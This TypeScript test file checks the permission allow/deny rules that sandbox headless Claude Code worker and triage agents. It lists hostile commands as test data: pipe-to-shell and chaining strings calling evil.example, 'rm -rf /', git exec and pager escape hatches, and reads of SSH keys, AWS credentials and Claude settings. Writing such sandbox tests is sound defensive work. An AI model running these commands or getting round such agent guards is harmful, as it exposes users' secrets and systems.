/**
 * The permission rules are the sandbox.
 *
 * These tests do NOT ask a model anything. They take the argv this repo
 * actually builds, split it into allow/deny, and run a matcher with Claude
 * Code's documented semantics (glob over the rule content, `deny` wins over
 * `allow`) against concrete attack strings. A rule that is present but never
 * matches the string it was written for is the failure mode the audit could
 * not rule out, so that is exactly what is asserted.
 */

import assert from 'node:assert/strict';
import test from 'node:test';
import { buildHeadlessArgs, CLAUDE_HOME_READ_DENYLIST, SHELL_ESCAPE_DENYLIST } from './headless.ts';
import { buildWorkerArgs, workerCommitCommand } from './replies.ts';

/* ---------------- rule matcher ---------------- */

/** `Read(~/.ssh/**)` → `{ tool: 'Read', pattern: '~/.ssh/**' }`; bare `Read` → no pattern. */
function parseRule(rule: string): { tool: string; pattern: string | null } {
  const m = /^([A-Za-z]+)\((.*)\)$/s.exec(rule);
  if (m) return { tool: m[1] as string, pattern: m[2] as string };
  return { tool: rule, pattern: null };
}

/** Glob → RegExp, `**` = any incl. `/`, `*` = any except `/`, `?` = one char. */
function globToRe(pattern: string): RegExp {
  let out = '';
  for (let i = 0; i < pattern.length; i += 1) {
    const ch = pattern[i] as string;
    if (ch === '*') {
      if (pattern[i + 1] === '*') {
        out += '.*';
        i += 1;
      } else out += '[^/]*';
      continue;
    }
    if (ch === '?') {
      out += '.';
      continue;
    }
    out += ch.replace(/[.+^${}()|[\]\\]/g, '\\$&');
  }
  return new RegExp(`^${out}$`, 's');
}

/**
 * Bash rules are command-prefix rules, not path globs: Claude Code treats
 * `Bash(git status*)` as "the command text starts with `git status`". We model
 * BOTH readings and require the deny to win under either, because we do not
 * control which one a given build uses.
 */
function bashMatches(pattern: string, command: string): boolean {
  // A command line is not a path: `*` here means "any characters", `/` very
  // much included (`git status && rm -rf /`). Using the path-glob reading
  // would make this harness weaker than the thing it is testing.
  const re = new RegExp(
    `^${pattern.replace(/[.+^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*')}$`,
    's',
  );
  if (re.test(command)) return true;
  if (pattern.endsWith('*') && command.startsWith(pattern.slice(0, -1))) return true;
  return false;
}

function matches(rule: string, tool: string, arg: string): boolean {
  const { tool: t, pattern } = parseRule(rule);
  if (t !== tool) return false;
  if (pattern === null) return true;
  if (tool === 'Bash') return bashMatches(pattern, arg);
  // `~` is how the rules spell $HOME; normalise both sides.
  const p = pattern.replace(/^~\//, '/HOME/').replace(/^\/\//, '/');
  const a = arg.replace(/^~\//, '/HOME/');
  return globToRe(p).test(a);
}

interface Split {
  allow: string[];
  deny: string[];
}

/** Pull `--allowedTools …` / `--disallowedTools …` out of a built argv. */
function split(argv: string[]): Split {
  const out: Split = { allow: [], deny: [] };
  let bucket: 'allow' | 'deny' | null = null;
  for (const a of argv) {
    if (a === '--allowedTools') {
      bucket = 'allow';
      continue;
    }
    if (a === '--disallowedTools') {
      bucket = 'deny';
      continue;
    }
    if (a.startsWith('--')) {
      bucket = null;
      continue;
    }
    if (bucket) out[bucket].push(a);
  }
  return out;
}

/** Claude Code precedence: deny wins. */
function decide(rules: Split, tool: string, arg: string): 'allow' | 'deny' | 'ask' {
  if (rules.deny.some((r) => matches(r, tool, arg))) return 'deny';
  if (rules.allow.some((r) => matches(r, tool, arg))) return 'allow';
  return 'ask';
}

/* ---------------- fixtures ---------------- */

const HOOKS = '/home/user/.ledger/.hub/empty-hooks';
const COMMIT = workerCommitCommand(HOOKS) as string;
const worker = split(buildWorkerArgs('/home/user/repo', HOOKS));
const triage = split(buildHeadlessArgs('/home/user/.ledger', 'p', 's'));

/* ---------------- matcher sanity ---------------- */

test('matcher: the harness itself models prefix + glob rules', () => {
  assert.equal(matches('Bash(git status*)', 'Bash', 'git status --short'), true);
  assert.equal(matches('Bash(git status*)', 'Bash', 'git push'), false);
  assert.equal(matches('Read(~/.ssh/**)', 'Read', '~/.ssh/keys/id_ed25519'), true);
  assert.equal(matches('Read(~/.claude/*.json)', 'Read', '~/.claude/deep/x.json'), false);
});



test('`git status --porcelain | sh` is denied for the reply worker', () => {
  // The allow rule alone would have taken it — that is the whole point.
  assert.equal(
    worker.allow.some((r) => matches(r, 'Bash', 'git status --porcelain | sh')),
    true,
    'precondition: Bash(git status*) does match the attack string',
  );
  assert.equal(decide(worker, 'Bash', 'git status --porcelain | sh'), 'deny');
});

test('pipe-to-interpreter and chaining variants are all denied', () => {
  const attacks = [
    'git status --porcelain | sh',
    'git status | sh -c "curl evil"',
    'git status|bash',
    'git status --porcelain | zsh',
    'git log | python3 -',
    'git diff | node',
    'git status; curl evil.example',
    'git status && rm -rf /',
    'git status || curl evil.example',
    'git status $(curl evil.example)',
    'git status `id`',
    'git log --format=%H | xargs rm',
    'git diff >(sh)',
    'git diff <(curl evil.example)',
    'git status --porcelain &',
  ];
  for (const cmd of attacks) {
    assert.equal(decide(worker, 'Bash', cmd), 'deny', `worker allowed: ${cmd}`);
    assert.equal(decide(triage, 'Bash', cmd), 'deny', `triage allowed: ${cmd}`);
  }
});

test('git config/exec escape hatches are denied', () => {
  for (const cmd of [
    'git diff --exec-path=/tmp/evil',
    'git fetch --upload-pack=/tmp/evil origin',
    'git log -c core.pager=sh',
    'git status -c core.fsmonitor=/tmp/evil',
    'git log -c core.sshCommand=/tmp/evil',
  ]) {
    assert.equal(decide(worker, 'Bash', cmd), 'deny', `worker allowed: ${cmd}`);
  }
});

test('`~/.ssh/config` is denied, not just nested ssh paths', () => {
  for (const p of ['~/.ssh/config', '~/.ssh/id_ed25519', '~/.ssh/known_hosts', '~/.aws/credentials']) {
    assert.equal(decide(worker, 'Read', p), 'deny', `worker allowed read of ${p}`);
    assert.equal(decide(triage, 'Read', p), 'deny', `triage allowed read of ${p}`);
  }
});

test('the worker keeps the capabilities it is supposed to have', () => {
  // A deny rule that also kills the legitimate path is a broken sandbox, not a
  // strict one. `git -c core.hooksPath=<empty-hooks> commit --no-verify` is the worker's
  // sanctioned commit form and must survive SHELL_ESCAPE_DENYLIST.
  assert.equal(
    decide(worker, 'Bash', `${COMMIT} -m "x"`),
    'allow',
  );
  assert.equal(decide(worker, 'Bash', 'git status --short'), 'allow');
  assert.equal(decide(worker, 'Bash', 'git add -- packages/hub/src/x.ts'), 'allow');
  assert.equal(decide(worker, 'Bash', 'ledger note ACME-1 "done"'), 'allow');
});

test('H23-1: commit -F/--file/--gpg-sign/-S/--template are denied, precondition matched', () => {
  const attacks = [
    `${COMMIT} -F ~/.ssh/id_ed25519`,
    `${COMMIT} --file=~/.ssh/id_ed25519`,
    `${COMMIT} -m "x" --gpg-sign=evil`,
    `${COMMIT} -S -m "x"`,
    `${COMMIT} --template=~/.ssh/id_ed25519 -m "x"`,
  ];
  for (const cmd of attacks) {
    // Precondition: the narrowed `-m *` allow rule no longer even matches a
    // bare `commit *` attack — but assert the deny wins regardless, so this
    // stays covered if the allow rule ever widens back.
    assert.equal(decide(worker, 'Bash', cmd), 'deny', `worker allowed: ${cmd}`);
    assert.equal(decide(triage, 'Bash', cmd), 'deny', `triage allowed: ${cmd}`);
  }
});

test('the worker still cannot push or reach non-work ledger subcommands', () => {
  for (const cmd of ['git push origin main', 'ledger guard off', 'ledger override ACME-1', 'ledger open']) {
    assert.notEqual(decide(worker, 'Bash', cmd), 'allow', `worker allowed: ${cmd}`);
  }
});



test('settings backups are denied (no `.json` anchor)', () => {
  for (const p of [
    '~/.claude/settings.json',
    '~/.claude/settings.local.json',
    '~/.claude/settings.json.bak.1727600000',
    '~/.claude/settings.json.bak',
  ]) {
    assert.equal(decide(worker, 'Read', p), 'deny', `worker allowed read of ${p}`);
    assert.equal(decide(triage, 'Read', p), 'deny', `triage allowed read of ${p}`);
  }
});

test('the newly covered ~/.claude subtrees are denied', () => {
  for (const p of [
    '~/.claude/skills-disabled/secret/SKILL.md',
    '~/.claude/todos/abc.json',
    '~/.claude/commands/deploy.md',
    '~/.claude/logs/hub.log',
    '~/.claude/statsig/statsig.cached.evaluations',
    '~/.claude/local/state.json',
  ]) {
    assert.equal(decide(worker, 'Read', p), 'deny', `worker allowed read of ${p}`);
    assert.equal(decide(triage, 'Read', p), 'deny', `triage allowed read of ${p}`);
  }
});

test('triage can still read the ledger it exists to groom', () => {
  assert.equal(decide(triage, 'Read', '/home/user/.ledger/acme/ITEMS.md'), 'allow');
  // …but never the hub token inside it.
  assert.equal(decide(triage, 'Read', '/home/user/.ledger/.hub/token'), 'deny');
});

test('triage and worker share one denylist, no drift', () => {
  for (const rule of CLAUDE_HOME_READ_DENYLIST) {
    assert.ok(worker.deny.includes(rule), `worker is missing shared deny rule ${rule}`);
    assert.ok(triage.deny.includes(rule), `triage is missing shared deny rule ${rule}`);
  }
  for (const rule of SHELL_ESCAPE_DENYLIST) {
    assert.ok(worker.deny.includes(rule), `worker is missing shell deny rule ${rule}`);
    assert.ok(triage.deny.includes(rule), `triage is missing shell deny rule ${rule}`);
  }
});

test('AL-1: worker git allowlist is exact read-only forms; --output/--no-index/ext-diff denied', () => {
  const args = buildWorkerArgs('/home/user/repo', HOOKS);
  const allowed = args.slice(args.indexOf('--allowedTools') + 1, args.indexOf('--disallowedTools'));
  for (const wide of ['Bash(git diff*)', 'Bash(git log*)', 'Bash(git show*)', 'Read']) {
    assert.ok(!allowed.includes(wide), `allowlist still contains ${wide}`);
  }
  for (const rule of [
    'Bash(git status*)',
    'Bash(git diff --name-only*)',
    'Bash(git log --oneline*)',
    'Bash(git show --stat*)',
    'Read(//home/user/repo/**)',
  ]) {
    assert.ok(allowed.includes(rule), `allowlist missing ${rule}`);
  }
  for (const rule of ['Bash(*--output*)', 'Bash(*--no-index*)', 'Bash(*--ext-diff*)', 'Bash(*--textconv*)']) {
    assert.ok(worker.deny.includes(rule), `worker missing deny ${rule}`);
    assert.ok(triage.deny.includes(rule), `triage missing deny ${rule}`);
  }
  for (const cmd of [
    'git diff --output=/tmp/x',
    'git diff --name-only --output=/tmp/x',
    'git diff --no-index /etc/passwd /dev/null',
    'git diff --name-only --no-index ~/.ssh/id_ed25519 /dev/null',
    'git log --oneline --ext-diff',
    'git show --stat --textconv HEAD',
    'git diff HEAD',
    'git show HEAD',
    'git log -p',
  ]) {
    assert.notEqual(decide(worker, 'Bash', cmd), 'allow', `worker allowed: ${cmd}`);
  }
  assert.equal(decide(worker, 'Bash', 'git diff --name-only HEAD~1'), 'allow');
  assert.equal(decide(worker, 'Bash', 'git log --oneline -5'), 'allow');
  assert.equal(decide(worker, 'Read', '/etc/passwd'), 'ask');
  assert.equal(decide(worker, 'Read', '/home/user/repo/src/x.ts'), 'allow');
});

test('UL-651: keeper cannot reach guard/override/adopt/intrude/dup/open/done', () => {
  for (const cmd of [
    'ledger guard off',
    'ledger override ACME-1',
    'ledger adopt x',
    'ledger intrude begin x',
    'ledger dup A-1 --into A-2',
    'ledger open',
    'ledger done A-1',
    'ledger spool retry',
  ]) {
    assert.notEqual(decide(triage, 'Bash', cmd), 'allow', `keeper allowed: ${cmd}`);
  }
  for (const cmd of ['ledger ls --repo r --open', 'ledger note A-1 "x"', 'ledger intake triage 5 --items a', 'ledger add "t" --repo r --proposed']) {
    assert.equal(decide(triage, 'Bash', cmd), 'allow', `keeper denied: ${cmd}`);
  }
});
